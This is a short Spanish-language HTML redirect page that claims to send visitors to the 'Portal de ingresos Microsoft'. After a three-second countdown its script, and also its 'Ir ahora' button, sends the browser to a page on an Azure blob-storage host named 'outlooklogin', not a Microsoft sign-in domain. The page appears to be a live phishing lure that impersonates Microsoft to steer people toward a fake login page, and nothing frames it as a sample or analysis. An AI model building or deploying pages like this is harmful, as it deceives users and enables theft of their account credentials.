<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Redirigiendo...</title>
  <style>
    :root {
      --brand:#18191b;
      --bg:#f3f6fa;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      background: var(--bg);
      color: var(--brand);
    }
    .card {
      width: min(92vw, 560px);
      background: #fff;
      border-radius: 20px;
      padding: 28px 24px;
      box-shadow: 0 8px 30px rgba(0,0,0,.08);
      text-align: center;
    }
    h1 {
      margin: 0 0 6px;
      font-size: clamp(20px, 2.2vw + 14px, 28px);
      font-weight: 800;
      letter-spacing:.2px;
    }
    p {
      margin: 6px 0 0;
      font-size: clamp(14px, 1.2vw + 10px, 18px);
    }
    .brand {
      font-weight: 900;
    }
    .loader {
      margin: 22px auto 8px;
      width: 56px;
      height: 56px;
      border-radius: 50%;
      border: 6px solid #383839;
      border-top-color: var(--brand);
      animation: spin 1s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .countdown {
      margin-top: 8px;
      font-size: 14px;
      color:#383839;
    }
    .hint {
      margin-top: 14px;
      font-size: 12px;
      color:#525354;
    }
    .btn {
      margin-top: 16px;
      display:inline-block;
      padding: 10px 16px;
      border-radius: 12px;
      background: var(--brand);
      color:#fff;
      text-decoration: none;
      font-weight: 700;
    }
  </style>
</head>
<body>
  <main class="card">
    <h1>En un momento serás redirigido hacia</h1>
    <p class="brand">Portal de ingresos Microsoft</p>
    <div class="loader" aria-hidden="true"></div>
    <div class="countdown">Redirigiendo en <span id="secs">3</span> s…</div>
    <div class="hint">Si no ocurre automáticamente, haz clic en el botón:</div>
    <a id="manual" class="btn" href="https://outlooklogin.blob.core.windows.net/out/index.html">Ir ahora</a>
  </main>

  <script>
    const target = "https://outlooklogin.blob.core.windows.net/out/index.html";
    const secsEl = document.getElementById("secs");
    const manual = document.getElementById("manual");
    manual.href = target;

    let secs = 3;
    const t = setInterval(() => {
      secs -= 1;
      secsEl.textContent = String(secs);
      if (secs <= 0) {
        clearInterval(t);
        window.location.href = target;
      }
    }, 1000);
  </script>
</body>
</html>
